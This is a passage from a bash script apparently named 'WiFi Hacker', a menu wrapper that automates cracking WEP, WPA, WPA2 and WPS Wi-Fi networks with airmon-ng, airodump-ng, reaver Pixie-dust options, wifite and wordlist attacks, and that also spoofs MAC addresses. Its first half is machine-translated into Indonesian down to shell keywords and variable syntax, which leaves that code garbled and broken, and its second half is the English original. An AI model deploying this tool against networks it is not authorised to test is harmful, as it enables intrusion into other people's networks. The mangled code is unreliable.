		terminalGnomeLegacy = "gnome-terminal -x"
		;;

		*)
		gnomeOptions = "baru"
		terminal = "gnome-terminal --window --geometry = 132x24 -"
		terminalGnome = "gnome-terminal --window --geometry = 132x24 -"
		terminalGnomeLegacy = "gnome-terminal -x"
		;;

	esac

	#echo "gnomeOptions: $ gnomeOptions"
	#baca jeda

	terminalKonsole = "konsole -e"
	terminalXterm = "xterm -e"

	bin = ""
	
}


setVariablesOptional () {

	currentTask = "setVariablesOptional"

	blank = ""

}


setVariablesAdvanced () {

	currentTask = "setVariablesAdvanced"

	blank = ""

}


setDefaults () {

	currentTask = "setDefaults"
	startMonitorMode = "airmon-ng start"
	stopMonitorMode = "airmon-ng stop"

	getRandomMacAddress = ""
	spoofStatus = "0"
	resetSpoofStatus = "0"

	enkripsiType = "kosong"
	enkripsiTypeText = "Kosong"

	ipStatus = "0"

	interface = "wlan0"
	# interfaceMonitor = "mon0"
	interfaceMonitor = "wlan0mon"
	interfaceName = "wlan0"
	interfaceMode = "0"
	interfaceNumber = "0"
	interfaceNumberMax = "99"
	interfacesFound = "0"
	bssid = ""
	essid = ""
	channel = ""

	noChannel = "0"

	# Ini digunakan untuk kembali dari backupCaptureFiles jika dipanggil dari backupCaptureFiles
	backupFromCaptureErase = "0"

	# Ini digunakan untuk kembali dari backupSessionFiles jika dipanggil dari backupSessionFiles
	backupFromSessionErase = "0"

	
	# Metode Serangan Default
	attackMethodWEP = ""
	attackMethodWPS = "reaver"
	attackMethodWPA = ""
	attackMethodWPA2 = ""


	#Cari Perintah Adaptor Jaringan
	showAdapterPciAll = $ (lspci | egrep -i 'network | ethernet')
	showAdapterUsbAll = $ (lsusb | egrep -i '')
	showAdapterUsbAtheros = $ (lsusb | egrep -i 'atheros | 0cf3')

	# Atheros WiFi Adapters
	showAdapterUsbAtherosAR9271 = $ (lsusb | egrep -i 'AR9271' | cut -d ":" -f3)

	# Intel WiFi Adapters
	showAdapterUsbIntel6205 = $ (lspci | egrep -i 'Intel Corporation Centrino Advanced-N 6205' | cut -d ":" -f3)

	# Dukungan Untuk 10 Nama Adaptor
	adapterNameDefault = "Tidak Ada Nama Adaptor Yang Tersedia"
	showAdapterOneName = "$ adapterNameDefault"
	showAdapterTwoName = "$ adapterNameDefault"
	showAdapterThreeName = "$ adapterNameDefault"
	showAdapterFourName = "$ adapterNameDefault"
	showAdapterFiveName = "$ adapterNameDefault"
	showAdapterSixName = "$ adapterNameDefault"
	showAdapterSevenName = "$ adapterNameDefault"
	showAdapterEightName = "$ adapterNameDefault"
	showAdapterNineName = "$ adapterNameDefault"
	showAdapterTenName = "$ adapterNameDefault"
	
	# Nilai Daftar Tangkapan Default
	listCap = 0
	listIvs = 0
	listXor = 0
	listCsv = 0
	listNetXml = 0

	hotkeyInput = ""

	apListType = ""

	# Nilai Sesi Default
	sessionID = "0"

	capturePath = $ (echo "$ PWD / sesi")
	capturePathWEP = $ (gema "$ PWD / sesi / wep")
	capturePathWPS = $ (gema "$ PWD / sesi / wps")
	capturePathWPA = $ (gema "$ PWD / sesi / wpa")
	capturePathWPA2 = $ (gema "$ PWD / sesi / wpa2")

	# Default Temp Direktori Arus Default
	whTemp = $ (echo "$ PWD / temp")

	defaultScanOutputIVS = "$ initPath / apScan-01.ivs"
	defaultScanOutputXML = "$ initPath / apScan-01.kismet.netxml"
	defaultScanOutputTXT = "$ initPath / apScan-01.txt"

}


setDefaultsWEP () {

	currentTask = "setDefaultsWEP"

	# aircrack-ng mode cracking WEP
	acMode = "1"

	# mode crack aircrack-ng WEP (WPA-PSK)
	# acMode = "2"

	washFile = "$ whTemp / wash.txt"
	washChannel = "1"

}


setDefaultsWPA () {

	currentTask = "setDefaultsWPA"

	wordlist = "/ usr / share / wordlists / metasploit / password.lst"

	retryDeauth = "0"

	serverWPA = ""

}


setDefaultsWPA2 () {

	currentTask = "setDefaultsWPA2"

}


setDefaultsWPS () {

	currentTask = "setDefaultsWPS"

	reaver = "reaver"

	reaverSessionPath = "etc / reaver"
	bssidCharOnly = ""

	reaverInterfaceInput = ""
	reaverBSSIDInput = ""

	reaverChannelInput = ""
	reaverESSIDInput = ""
	reaverExecInput = ""
	reaverMACInput = ""
	reaverOutfileInput = ""
	reaverSessionInput = ""

	reaverDelayInput = ""
	reaverFailWaitInput = ""
	reaverM57TimeoutInput = ""
	reaverMaxAttemptsInput = ""
	reaverPinInput = ""
	reaverTimeoutInput = ""

	reaverDelay = "- delay ="
	reaverDHSmall = "- dh-small"
	reaverEAPTerminate = "- eap-terminate"
	reaverFailWait = "- fail-wait ="
	reaverIgnoreLocks = "- abaikan-kunci"
	reaverM57Timeout = "- m57-timeout ="
	reaverMaxAttempts = "- maks-upaya ="
	reaverNack = "- nack"
	reaverNoAssociate = "- no-associate"
	reaverNoNacks = "- no-nacks"
	reaverPin = "- pin ="
	reaverRecurringDelay = "- penundaan berulang"
	reaverTimeout = "- timeout ="
	reaverWin7False = "- win7"

	reaver5ghz = "- 5ghz"
	reaverAuto = "- otomatis"
	reaverChannel = "- channel ="
	reaverDaemonize = "- daemonize"
	reaverESSID = "- essid ="
	reaverExec = "- exec ="
	reaverFixed = "- diperbaiki"
	reaverHelp = "- help"
	reaverMAC = "- mac ="
	reaverOutfile = "- out-file ="
	reaverQuiet = "- quiet"
	reaverSession = "- session ="
	reaverVerbose = "- v"
	reaverVerboseMore = "- vv"

	# Opsi Yang Diperbarui
	reaverDaemonize = "- D"
	reaverExhaustive = "- X"
	reaverNoAutoPass = "- Z"
	reaverP1Index = "- 1"
	reaverP2Index = "- 2"
	reaverPixie = "- K"
	reaverPixieLoop = "- P"
	reaverGeneratePin = "- W"

	reaverCurrentSessionFile = ""

	# -K Nomor Argumen (Default 1)
	pixieNumber = "1"

	# Periksa untuk melihat apakah Serangan Pixie Gagal
	pixieFailed = "0"


	wifite = "wifite"
	wifiteAttackAll = "wifite --all"
	wifiteAttackWEP = "wifite --all --wep"
	wifiteAttackWPA = "wifite --all --wpa"
	wifiteAttackWPA2 = "wifite --all --wpa"
	wifiteAttackWPS = "wifite --all --wps"

	# Opsi Bully
	Antarmuka #bully <options>
	
}


############################################### ##########################
# VARIABEL DEFAULT AKHIR ################################################## ##
############################################### ##########################





############################################### ##########################
# DISCLAIMER BEGIN ################################################## ######
############################################### ##########################


showDisclaimer () {

	currentTask = "showDisclaimer"
	lastMenuID = "showDisclaimer"

	sessionCreatePaths
	sessionRemoveEmpty

	bannerSlim

	$ cyan
	gema ""
	echo "********************************************** ************************************************ ** "
	echo "INI AKAN MENGAKHIRI KONEKSI INTERNET AKTIF! JIKA ANDA MEMILIKI MASALAH YANG TERKAIT DENGAN INTERNET"
	echo "SETELAH SERANGAN TELAH DILAKUKAN, GUNAKAN OPSI EXTRAS DI TOOLBAR UNTUK MEMULAI DAN BERHENTI LAYANAN."
	echo "JIKA INI TIDAK BEKERJA, MAKA ANDA BISA MEMULAI ULANG SCRIPT INI, ATAU KEMUDI MESIN DAN KEMBALI KE NORMAL."
	echo "********************************************** ************************************************ ** "
	gema ""
	$ hijau
	echo "********************************************** ********** "
	echo "ANDA HARUS SETUJU DENGAN SYARAT-SYARAT INI SEBELUM MENGGUNAKAN PERANGKAT LUNAK INI!"
	echo "********************************************** ********** "
	$ putih
	gema ""
	echo "Dengan menggunakan skrip ini, Anda menyetujui persyaratan berikut:"
	gema ""
	gema "1) Tidak digunakan untuk menyerang titik akses yang Anda tidak memiliki izin untuk menguji"
	gema ""
	gema "2) Tetap dalam batas hukum kekuatan transmisi, tergantung pada hukum negara Anda"
	gema ""
	gema "3) Tetap dalam batas hukum penggunaan saluran, tergantung pada hukum negara Anda"
	gema ""
	$ hijau
	echo "********************************************** ********** "
	echo "ANDA HARUS SETUJU DENGAN SYARAT-SYARAT INI SEBELUM MENGGUNAKAN PERANGKAT LUNAK INI!"
	echo "********************************************** ********** "
	$ putih
	gema ""
	gema ""
	gema ""
	echo "TOLONG PRESS" \ "" Y "\" "DAN ENTER UNTUK MENERIMA DAN LANJUTKAN"
	gema ""

	baca acceptToDisclaimer

	case "$ agreeToDisclaimer" di

		"")
		bannerExit
		;;

		"Y" | "y")
		periksaForUpdates
		fixNegativeOneChannelError
		#initAirmon
		fixAirmonCompat
		#startNetworkManager
		#killNetworkManager
		#wpaSupplicantKill
		#initMonitorMode
		#stopMonitorMode
		#checkMultipleAdapters
		menu utama
		;;

		*)
		bannerExit
		;;

	esac

}


isUnreleased () {

	currentTask = "isUnreleased"
	lastMenuID = "isUnreleased"

	sessionCreatePaths
	sessionRemoveEmpty

	bannerSlim

	$ cyan
	gema ""
	echo "********************************************** ************************************************ ** "
	echo "INI AKAN MENGAKHIRI KONEKSI INTERNET AKTIF! JIKA ANDA MEMILIKI MASALAH YANG TERKAIT DENGAN INTERNET"
	echo "SETELAH SERANGAN TELAH DILAKUKAN, GUNAKAN OPSI EXTRAS DI TOOLBAR UNTUK MEMULAI DAN BERHENTI LAYANAN."
	echo "JIKA INI TIDAK BEKERJA, MAKA ANDA BISA MEMULAI ULANG SCRIPT INI, ATAU KEMUDI MESIN DAN KEMBALI KE NORMAL."
	echo "********************************************** ************************************************ ** "
	gema ""
	$ hijau
	echo "********************************************** ********** "
	echo "ANDA HARUS SETUJU DENGAN SYARAT-SYARAT INI SEBELUM MENGGUNAKAN PERANGKAT LUNAK INI!"
	echo "********************************************** ********** "
	gema ""
	$ kuning
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	echo "*** INI TIDAK TERLARANG DAN HARUS DIPERTIMBANGKAN SEBUAH VERSI UJI ***"
	gema ""
	$ hijau
	echo "********************************************** ********** "
	echo "ANDA HARUS SETUJU DENGAN SYARAT-SYARAT INI SEBELUM MENGGUNAKAN PERANGKAT LUNAK INI!"
	echo "********************************************** ********** "
	gema ""
	gema ""
	gema ""
	$ putih
	echo "TOLONG PRESS" \ "" Y "\" "DAN ENTER UNTUK MENERIMA DAN LANJUTKAN"
	gema ""

	baca acceptToDisclaimer

	case "$ agreeToDisclaimer" di

		"")
		bannerExit
		;;

		"Y" | "y")
		periksaForUpdates
		fixNegativeOneChannelError
		#initAirmon
		fixAirmonCompat
		#startNetworkManager
		#killNetworkManager
		#wpaSupplicantKill
		#initMonitorMode
		#stopMonitorMode
		#checkMultipleAdapters
		menu utama
		;;

		*)
		bannerExit
		;;

	esac

}


############################################### ##########################
# PERNYATAAN DISCLAIMER ################################################### #########
############################################### ##########################





############################################### ##########################
# BANNERS BEGIN ################################################### ##########
############################################### ##########################


spanduk(){

	setWindowTitle

	currentTask = "spanduk"

	bersih
	$ biru
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "| [M] Menu Utama | * WiFi Hacker v $ versionBase / esc0rtd3w 2019 / github.com/esc0rtd3w * | [X] Keluar |"
	echo "--------------------- *************************** *********************************** ------------- --------- "
	$ kuning
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	echo "| Antarmuka: $ interfacesFound | Mode Antarmuka: $ interfaceMode | [A] Lanjutan | Sesi: [S] Simpan [L] Muat | [E] Ekstra [H] Bantuan |"
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	#echo ""
	$ putih

}


bannerNoMenu () {

	currentTask = "bannerNoMenu"

	setWindowTitle

	bersih
	$ biru
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "| [CTRL + C] Utama | * WiFi Hacker v $ versionBase / esc0rtd3w 2019 / github.com/esc0rtd3w * | [CTRL + C x2] Keluar |"
	echo "--------------------- *************************** *********************************** ------------- --------- "
	$ kuning
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	echo "| Antarmuka: $ interfacesFound | Mode Antarmuka: $ interfaceMode | [A] Lanjutan | Sesi: [S] Simpan [L] Muat | [E] Ekstra [H] Bantuan |"
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	#echo ""
	$ putih

}


bannerMain () {

	currentTask = "bannerMain"

	setWindowTitle

	bersih
	$ biru
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "| [] | * WiFi Hacker v $ versionBase / esc0rtd3w 2019 / github.com/esc0rtd3w * | [CTRL + C] Keluar |"
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	$ kuning
	echo "| Antarmuka: $ interfacesFound | Mode Antarmuka: $ interfaceMode | [A] Lanjutan | Sesi: [S] Simpan [L] Muat | [E] Ekstra [H] Bantuan |"
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	#echo ""
	$ putih

}

bannerMenu () {

	currentTask = "bannerMenu"

	setWindowTitle

	bersih
	$ biru
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "| [] | * WiFi Hacker v $ versionBase / esc0rtd3w 2019 / github.com/esc0rtd3w * | [CTRL + C] Keluar |"
	echo "--------------------- *************************** *********************************** ------------- --------- "
	$ kuning
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	echo "| Antarmuka: $ interfacesFound | Mode Antarmuka: $ interfaceMode | [A] Lanjutan | Sesi: [S] Simpan [L] Muat | [E] Ekstra [H] Bantuan |"
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	#echo ""
	$ putih

}

bannerSlim () {

	currentTask = "bannerSlim"

	setWindowTitle

	bersih
	$ biru
	echo "--------------------- *************************** *********************************** ------------- --------- "
	echo "| [] | * WiFi Hacker v $ versionBase / esc0rtd3w 2019 / github.com/esc0rtd3w * | [CTRL + C] Keluar |"
	echo "--------------------- *************************** *********************************** ------------- --------- "
	$ putih

}


bannerStats () {

	currentTask = "bannerStats"

	$ cyan
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	echo "Antarmuka: $ interfaceName / MAC: $ ​​macAddressMonitor / ESSID: $ essid / BSSID: $ bssid / Channel: $ channel"
	echo "------------------------------------------------ -------------------------------------------------- ----------------- "
	gema ""
	$ putih

}

bannerExit () {

	currentTask = "bannerExit"

	sessionWriteEndCurrent

	sessionRemoveEmpty

	forceDisconnectWifi

	bersih
	$ biru
	gema "Terima Kasih Untuk Bermain Adil;)"
	gema ""
	gema "esc0rtd3w 2019"
	gema ""
	gema ""
	$ cyan
	echo "Lihat Proyek Saya Lainnya Di GitHub:"
	gema ""
	gema "https://github.com/esc0rtd3w"
	gema ""
	gema ""

	keluar

}

bannerExitUpdate () {

	currentTask = "bannerExitUpdate"

	bersih
	$ hijau
	echo "Script Hacker WiFi Telah Diperbarui ke Versi $ versionRemote"
	gema ""
	echo "Script Baru Berada Di $ initPath / $ newVersionScript"
	gema ""
	gema ""
	gema ""
	echo "Untuk meluncurkan skrip baru ketikkan dua baris berikut ke dalam terminal ini TANPA KUTIPAN"
	gema ""
	gema "\" chmod a + x $ newVersionScript \ ""
	gema ""
	gema "\" ./$ newVersionScript \ ""
	gema ""
	gema ""
	gema ""
	$ biru
	gema "Terima Kasih Untuk Bermain Adil;)"
	gema ""
	gema "esc0rtd3w 2019"
	gema ""
	gema ""
	$ cyan
	echo "Lihat Proyek Saya Lainnya Di GitHub:"
	gema ""
	gema "https://github.com/esc0rtd3w"
	gema ""
	gema ""

	keluar

}


############################################### ##########################
# BANNERS END ################################################## ############
############################################### ##########################





############################################### ##########################
# GLOBAL TEXT BEGIN ################################################# ######
############################################### ##########################


# Penggunaan: doSleepMessage "message" "time" "color"
# Contoh Penggunaan: doSleepMessage "Mohon Tunggu ...." "5" "$ red"
doSleepMessage () {

	message = "$ 1"
	waktu = "$ 2"
	color = "$ 3"

	currentTask = "doSleepMessage"

	spanduk
	bannerStats
	$ warna
	gema "$ message"
	tidur $ waktu

}


############################################### ##########################
# AKHIR TEKS GLOBAL ################################################## #########
############################################### ##########################





############################################### ##########################
# UPDATE STUFF BEGIN ################################################## #####
############################################### ##########################


checkForUpdates () {

	currentTask = "checkForUpdates"

	checkConnectionStatus

	# Jika entri kosong dibuat untuk melewati pembaruan maka nilai ini harus 1
	huruf "$ skipUpdate" di

		"0")
		# Jika koneksi dapat terhubung ke internet, periksa pembaruan
		huruf "$ ipStatus" di

			"1")
			Perbarui menu
			;;

		esac

		;;

	esac

}


menuUpdate () {

	currentTask = "menuUpdate"

	# Periksa server jauh untuk versi pembaruan
	case "$ updateChecked" di

		"0")

		# Pastikan ada koneksi internet aktif
		huruf "$ ipStatus" di

			"1")
			cek pembaruan
			;;

		esac

		;;

	esac

	# Tetapkan pilihan default
	updateChoice = ""
	
	bannerSlim

	gema ""
	#echo "Perbarui Menu"
	#echo ""
	#echo ""
	#echo ""

	# Jika versi jarak jauh bukan yang lebih baru, maka versi lokal harus berwarna hijau
	case "$ newUpdateAvailable" di

		"0")
		$ hijau
		;;

		"1")
		$ kuning
		;;

		"2")
		$ magenta
		;;

	esac

	echo "Versi Lokal: v $ versionBase"
	gema ""

	# Jika versi jarak jauh lebih baru, maka versi lokal tidak boleh hijau
	case "$ newUpdateAvailable" di

		"0")
		$ kuning
		;;

		"1")
		$ hijau
		;;

		"2")
		$ magenta
		;;

	esac

	echo "Versi Jarak Jauh: v $ versionRemote"
	$ putih
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	echo "Pilih opsi dan tekan ENTER:"
	gema ""
	gema ""
	echo "1) Periksa Pembaruan Baru"
	gema ""
	echo "2) Menerapkan Pembaruan Baru"
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	gema ""
	$ cyan
	echo "SECARA OTOMATIS DALAM 10 DETIK ...."
	$ putih
	gema ""

	#baca pembaruanChoice
	baca -t 10 perbaruiChoice

	huruf "$ updateChoice" di

		"")
		skipUpdate = "1"
		returnToUpdatePage = "0"
		#baca jeda
		;;

		"1")
		# Reset pembaruan Tandai Bendera
		updateChecked = "0"

		returnToUpdatePage = "1"
		cek pembaruan
		;;

		"2")

		case "$ newUpdateAvailable" di

			# Tidak Ada Pembaruan Tersedia / Versi Jarak Jauh Cocok Dengan Lokal
			"0")
			returnToUpdatePage = "0"
			
			spanduk
			$ red
			gema ""
			echo "Tidak Ada Pembaruan Yang Tersedia!"
			gema ""
			gema ""
			gema ""
			gema ""
			gema ""
			gema ""
			$ cyan
			echo "Melanjutkan Ke Menu Utama Dalam 5 Detik ...."
			gema ""
			gema ""

			baca -t 5 noUpdateTersedia
			;;

			# Pembaruan Tersedia / Versi Jarak Jauh Lebih Tinggi Daripada Lokal
			"1")
			returnToUpdatePage = "0"
			getUpdate
			;;

			# Versi Build / Remote Dev Lebih Rendah Daripada Lokal
			"2")
			returnToUpdatePage = "0"

			spanduk
			$ magenta
			gema ""
			echo "Anda Memiliki Versi Pengembang yang Tidak Dirilis"
			gema ""
			gema ""
			gema ""
			$ hijau
			gema ""
			echo "* UNTUK MEMENUHI PEMBARUAN DARI PRESS REMOTE VERSION PRESS \" F \ "AND ENTER *"
			gema ""
			gema ""
			gema ""
			gema ""
			$ cyan
			echo "Melanjutkan Ke Menu Utama Dalam 10 Detik ...."
			gema ""
			gema ""

			baca -t 10 noUpdateTersedia

			# Periksa Bendera Pembaruan Paksa
			case "$ noUpdateAvailable" di

				"F" | "f")
				returnToUpdatePage = "0"
				getUpdate
				;;

			esac
			;;

		esac
		;;

		"x" | "X")
		bannerExit
		;;

	esac

}


cek pembaruan(){

	currentTask = "checkUpdate"
	
	wget -O "$ updateTemp" $ updateMaster

	versionRemoteTemp = $ (cat $ updateTemp | grep versionBase = | cut -d "\" "-f2 | head -c 3)

	versionRemote = "$ versionRemoteTemp"

	case "$ isDebugMode" di
		"1")
		echo "versionRemote: $ versionRemote"
		baca jeda
		;;
	esac

	cleanVersionNumbers
	bandingkan Perbarui Versi

	#echo "newUpdateAvailable: $newUpdateAvailable"
	#read pause

	rm $updateTemp

	updateChecked="1"

	case "$returnToUpdatePage" in

		"1")
		menuUpdate
		;;
	
	esac

}


getUpdate(){

	currentTask="getUpdate"
	
	# Get Base Script Name
	#newVersionScript=$(printf '%s\n' "${0##*/}")
	newVersionScript=$(basename -- "$0")
	
	# Download New Script
	wget -O "$initPath/$newVersionScript.tmp" $updateMaster

	#read pause

	# Make Backup of Original Script
	cp "$initPath/$newVersionScript" "$initPath/$newVersionScript.BACKUP"

	# Remove Old Script
	rm -f "$initPath/$newVersionScript"

	# Copy New Script
	cp "$initPath/$newVersionScript.tmp" "$initPath/$newVersionScript"

	# Remove Temp Script
	rm -f "$initPath/$newVersionScript.tmp"

	#read pause

	bannerExitUpdate

}


cleanVersionNumbers(){

	currentTask="cleanUpdateVersion"

	versionBaseClean=$(echo $versionBase | sed -e 's/\.//')

	versionRemoteClean=$(echo $versionRemote | sed -e 's/\.//')

	#echo "Local Version: $versionBaseClean"
	#echo "Remote Version: $versionRemoteClean"
	#read pause

}


compareUpdateVersions(){

	# Compare Local and Remote Versions (0 = Not Greater / 1 = Greater) (Not working?? 20170102)
	#versionCompare=$(echo "$versionBaseClean <= $versionRemoteClean" | awk '{print ($versionBaseClean <= $versionRemoteClean)}')

	if [ $versionRemoteClean -lt $versionBaseClean ]; then
		
		newUpdateAvailable="2"
		isDevBuild="1"
	
	fi
	
	if [ $versionRemoteClean -gt $versionBaseClean ]; then

		newUpdateAvailable="1"
		isDevBuild="0"
	
	fi

	if [ $versionRemoteClean -eq $versionBaseClean ]; then
		
		newUpdateAvailable="0"
		isDevBuild="0"
	
	fi

}


############################################################################
#   UPDATE STUFF END   #####################################################
############################################################################





############################################################################
#   OTHER MISC STUFF BEGIN   ###############################################
############################################################################


checkRootStatus(){

	userPriv="none"

	isRoot=$(whoami | grep root)

	case "$isRoot" in

		"root")
		userPriv="root"

	esac

	if [ "$userPriv" != "root" ]; then
		noRootAccess
	fi

}



noRootAccess(){

	banner
	bannerStats

	$red
	echo "Yikes! No Root Access!"
	$white
	echo ""
	echo ""
	echo "I Currently Have Nothing Scripted To Handle This :("
	echo ""
	echo "Please login as a root user and try again!"
	echo ""
	echo ""
	echo "Press ENTER to exit this script...."
	echo ""
	echo ""

	read pause


	bannerExit

}


checkConnectionStatus(){

	ipStatus="0"
	ipStatusText="None"

	ipStatusTemp=$(ping -c 1 google.com | grep "1 received")

	ipStatus=$(echo "$ipStatusTemp" | cut -c1)


	case "$ipStatus" in

		"1")
		ipStatus="1"
		ipStatusText="Wifi"
		;;

	esac

	case "$ipStatusText" in

		"None")
		ipStatus="0"
		;;

	esac

	#echo "$ipStatusText"

	#read pause

}


fixAirmonCompat(){

	#$terminal airmon-ng check kill&
	airmon-ng check kill&
	#airmon-ng check kill&

}


checkWifiandDisplayMessage(){

	case "$ipStatusText" in

		"Wifi")
		banner
		echo ""
		echo "YOU MUST DISCONNECT FROM WIFI BEFORE CONTINUING!!!!"
		echo ""
		echo ""
		echo "PRESS ENTER TO RETURN TO MAIN MENU...."
		echo ""
		echo ""

		read pause

		menuMain
		;;

	esac

}


# Tries fixing issues with connection staying persistant to WiFi
forceDisconnectWifi() {

	#stopMonitorMode
	#killNetworkManager
	NetworkManager
	#disableChannelHopping
	enableChannelHopping

}


############################################################################
#   OTHER MISC STUFF END   #################################################
############################################################################





############################################################################
#   MENUS: MAIN BEGIN   ####################################################
############################################################################


loadMenuHotkeys(){

case "$hotkeyInput" in

	"M" | "m")

	# Check for resetSpoofStatus Flag
	case "$resetSpoofStatus" in

		"1")
		spoofStatus="0"
		;;

	esac

	killAll
	stopMonitorMode
	menuMain
	;;

	"A" | "a")
	menuAdvanced
	;;

	"S" | "s")
	checkForEmptyEncryptionType

	case "$bssid" in

		"")
		menuMain
		;;

	esac

	if [ "$bssid" != "" ]; then
		menuSessionSave
	fi
	;;

	"L" | "l")
	checkForEmptyEncryptionType
	menuSessionLoad
	;;

	"H" | "h")
	menuHelp
	;;

	"E" | "e")

	case "$lastMenuID" in

		"menuMain")
		menuMain
		;;

		*)
		menuExtras
		;;

	esac
	
	;;

	"X" | "x")
	killAll
	stopMonitorMode
	bannerExit
	;;

esac

}


menuMain(){

	currentTask="menuMain"
	lastMenuID="menuMain"

	# Create temp folder to use for text dumps, etc
	mkdir $whTemp

	checkRootStatus
	sessionCreatePaths
	sessionRemoveEmpty

	checkMultipleAdapters
	checkInterfaceMode

	checkConnectionStatus

	case "$ipStatus" in

		"1")
		banner
		echo ""
		echo "Loading Menu...."	
		echo ""
		echo ""

		forceDisconnectWifi
		checkConnectionStatus

		sleep 3

		menuMain
		;;

		"0")
		banner
		echo ""
		#echo "Welcome to the WiFi Hacker script!"
		echo "Compatible with all WEP/WPA/WPA2/WPS protected WiFi routers."
		echo ""
		$red
		echo "**********************************************************************"
		echo "YOU MUST DISCONNECT FROM ANY WIRELESS CONNECTIONS BEFORE CONTINUING!!!"
		echo "**********************************************************************"
		echo ""

		case "$ipStatus" in
			"0")
			$green
			;;

			"1")
			$red
			;;
		esac
		echo "You are currently connected to: $ipStatusText"
		$white
		echo ""
		echo ""
		#$cyan
		echo "0) Auto Mode    (Uses WiFite In Full Automatic Mode. Applies To All Encryption Types)"
		#$white
		echo ""
		echo "1) WEP Mode     (Menu Options Can Be Selected To Easily Circumvent Any WEP Connection)"
		echo ""
		echo "2) WPS Mode     (Pin Vulnerability Attack. May Also Have WPA, WPA2, or WEP Displayed)"
		echo ""
		echo "3) WPA Mode     (Capture 4-way Handshake, Dictionary Attack, Bruteforce, Custom Wordlist, and More)"
		echo ""
		echo "4) WPA2 Mode    (Identical To WPA Attacks, Except Target Encryption Type)"
		echo ""
		echo ""
		echo ""
		echo "Select a mode from above and press Enter:"
		echo ""

		read getMode

		hotkeyInput="$getMode"	

		loadMenuHotkeys "$hotkeyInput"

		case "$getMode" in

			"")
			menuMain
			;;

			"0")
			checkConnectionStatus
			checkWifiandDisplayMessage
			menuAttacksAllWifiteAuto
			menuMain
			;;

			"1")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWEP
			encryptionType="wep"
			encryptionTypeText="WEP"
			checkSpoofStatus
			menuAuto
			;;

			"2")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPS
			encryptionType="wps"
			encryptionTypeText="WPS"
			checkSpoofStatus
			menuAuto
			;;

			"3")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPA
			encryptionType="wpa"
			encryptionTypeText="WPA"
			checkSpoofStatus
			menuAuto
			;;

			"4")
			checkConnectionStatus
			checkWifiandDisplayMessage
			mkdir $capturePathWPA2
			encryptionType="wpa2"
			encryptionTypeText="WPA2"
			checkSpoofStatus
			menuAuto
			;;

			*)
			menuMain
			;;

		esac
		;;

	esac

	#menuMain
}


menuAuto(){

	currentTask="menuAuto"
	lastMenuID="menuAuto"

	case "$encryptionTypeText" in

		"Empty")
		menuMain
		;;

	esac

	#sessionCopyNewCaptureFiles
	sessionRemoveEmpty

	cleanTempScanResultsFile "all"

	checkInterfaceMode

	banner
	bannerStats
	
	$green
	echo ""
	echo "You are ready to begin the $encryptionTypeText attack!"
	echo ""
	$white

	case "$encryptionTypeText" in

		"WEP")
		echo "To perform a fully automated attack, type AUTOWEP end press ENTER"
		;;

		"WPS")
		echo "To perform a fully automated attack, type AUTOWPS end press ENTER"
		;;

		"WPA")
		echo "To perform a fully automated attack, type AUTOWPA end press ENTER"
		;;

		"WPA2")
		echo "To perform a fully automated attack, type AUTOWPA2 end press ENTER"
		;;

	esac

	echo ""
	echo "YOU MAY NOW OPTIONALLY PRESS THE \"W\" KEY ON KEYBOARD TO YOUR SPOOF MAC ADDRESS"
	echo ""
	echo ""
	echo ""
	echo "The next step will run an airodump-ng session in a new window."
	echo ""
	echo "Once you enter all required info, the new window will be closed"
	echo ""
	echo ""
	echo ""
	echo "Press ENTER to clear the current session and select a target...."
	echo ""
	echo "YOU MAY ALSO PRESS THE \"P\" KEY ON KEYBOARD TO LOAD PREVIOUS SESSION"
	echo ""

	read readyForAirodumpScan

	hotkeyInput="$readyForAirodumpScan"

	loadMenuHotkeys "$hotkeyInput"	

	case "$readyForAirodumpScan" in

		"")
		killAll
		checkForEmptyEncryptionType

		# Run wash if WPS
		case "$encryptionTypeText" in

			"WPS")
			#$terminal wash -i $interfaceMonitor -o "$washFile" -C
			;;

		esac

		autoModeNoPreviousSession
		;;

		"P" | "p")
		checkForEmptyEncryptionType

		checkForEmptyCredentials "bssid"
		checkForEmptyCredentials "essid"
		checkForEmptyCredentials "channel"

		autoModeUsePreviousSession
		;;

		"W" | "w")
		#returnTo="menuAuto"
		spoofMacAddress
		menuAuto
		;;

		"autowep" | "AUTOWEP" | "AutoWEP" | "AutoWep" | "autoWEP" | "autoWep")
		menuAttacksWEPWifiteAuto
		;;

		"autowps" | "AUTOWPS" | "AutoWPS" | "AutoWps" | "autoWPS" | "autoWps")
		menuAttacksWPSWifiteAuto
		;;

		"autowpa" | "AUTOWPA" | "AutoWPA" | "AutoWpa" | "autoWPA" | "autoWpa")
		menuAttacksWPAWifiteAuto
		;;

		"autowpa2" | "AUTOWPA2" | "AutoWPA2" | "AutoWpa2" | "autoWPA2" | "autoWpa2")
		menuAttacksWPA2WifiteAuto
		;;

		*)
		menuAuto
